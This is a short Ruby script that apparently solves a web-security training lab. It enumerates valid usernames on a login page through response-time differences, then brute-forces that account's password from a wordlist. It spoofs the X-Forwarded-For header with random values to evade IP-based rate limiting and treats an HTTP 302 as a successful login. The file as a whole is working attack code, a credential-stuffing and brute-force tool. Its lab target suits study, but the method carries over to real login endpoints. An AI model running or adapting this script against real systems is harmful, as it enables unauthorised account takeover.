require 'http'
require 'nokogiri'

url = 'https://0a64003404e6e913811e078f003800a1.web-security-academy.net/login'

fhu = File.new 'users.txt','r'
fhp = File.new 'passwd.txt','r'

users = fhu.readlines
passwd = fhp.readlines
fhu.close
fhp.close
password='a'*100

# Enumerate username, need to take a benchmark for timing and then set cond to autmatically give the username, wdi tomorrow
users.count.times do |p|
	sleep 1 
	st = Time.now()
	cli = HTTP.headers('X-Forwarded-For'=>"#{rand(1..105)}").cookies(:session=>"knx1VtfPv9RtxGmVSmp8mprzNwRYW0ET").post(url,:form => {:username=>"#{users[p].chomp}",:password=>"#{password}"})
	resph = cli.body.to_s
	print "#{users[p].chomp} : "
	puts Time.now-st
=begin
Unable to get a consistent response time, since there's no constant range,i am not harcoding it. You can try to increase password length and see if you get a consistent delayed response. Once you get the username, just put it in valid_username variable and voila!
=end
end

# Enumerate Valid Password 
valid_username = 'adsl'
passwd.count.times do |i|
	sleep 1
	cli = HTTP.headers('X-Forwarded-For'=>"#{rand(1..105)}").post(url,:form => {:username=>"#{valid_username}",:password=>"#{passwd[i].chomp}"})
	code =cli.code 
	puts code
	if code==302
		puts "Password : #{passwd[i].chomp}"
		break
	end
end
